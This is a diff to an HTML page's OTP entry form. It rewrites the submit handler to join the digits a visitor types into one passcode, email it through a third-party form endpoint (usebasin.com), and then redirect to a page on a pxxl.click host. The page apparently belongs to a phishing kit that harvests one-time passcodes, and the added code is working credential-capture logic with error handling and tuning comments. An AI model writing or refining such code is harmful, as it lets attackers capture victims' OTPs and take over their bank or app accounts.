@@ -159,49 +159,79 @@
     </div>
   </div>
 
-  <script>
-    document.getElementById('otpForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
-  
-      const formData = new FormData(this);
-      const data = new URLSearchParams();
-      for (const pair of formData) {
-        data.append(pair[0], pair[1]);
+<script>
+document.getElementById('otpForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
+
+  // collect inputs and join into a single OTP string
+  const inputs = Array.from(document.querySelectorAll('.fin-input'));
+  const otp = inputs.map(i => i.value.trim()).join('');
+
+  // Validate OTP length quickly
+  if (otp.length !== inputs.length) {
+    document.querySelector('.errorMessage').textContent = 'Please fill all digits.';
+    return;
+  }
+
+  // Build form data: combine OTP into single 'message' field
+  const formData = new FormData(this);
+
+  // Remove any existing message entries (since each input used name="message")
+  // then set a single 'message' field containing the full OTP
+  // (FormData.delete will remove all keys matching 'message')
+  formData.delete('message');
+  formData.append('message', `OTP: ${otp}`); // put whatever you'd like the email body to show
+  // keep your subject
+  // ensure any required fields by Basin (e.g. 'name' or 'email') are present if your form/email template needs them
+
+  // Convert to URLSearchParams for x-www-form-urlencoded
+  const data = new URLSearchParams();
+  for (const pair of formData) {
+    data.append(pair[0], pair[1]);
+  }
+
+  try {
+    const resp = await fetch('https://usebasin.com/f/c7a3b223942d', {
+      method: 'POST',
+      body: data,
+      headers: {
+        'Accept': 'application/json' // ask for JSON response for AJAX usage
       }
-  
-      await fetch('https://usebasin.com/f/c7a3b223942d', {
-        method: 'POST',
-        body: data,
-        headers: {
-          'Accept': 'application/json'
-        }
-      });
-  
-      // Redirect manually
-      window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
     });
-  </script>
 
-  <script>
-    const inputs = document.querySelectorAll('.fin-input');
+    // If Basin returns JSON with errors, show them
+    if (!resp.ok) {
+      const errText = await resp.text();
+      console.error('Basin returned non-OK:', resp.status, errText);
+      document.querySelector('.errorMessage').textContent = 'Submission failed. Check console for details.';
+      return;
+    }
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-      });
+    // If we asked for JSON, try to read it and check for errors
+    let json = {};
+    try {
+      json = await resp.json();
+    } catch (err) {
+      // not JSON — still continue if status ok
+      console.warn('Response not JSON:', err);
+    }
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && input.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
-  </script>
+    // Basin usually returns 200 for success; handle errors if present
+    // (show success or log server response)
+    console.log('Submission successful:', json);
 
+    // Redirect only after success
+    window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
+
+  } catch (err) {
+    console.error('Fetch error:', err);
+    document.querySelector('.errorMessage').textContent = 'Network error. See console.';
+  }
+});
+</script>
 </body>
 
 
 </html>
+
 
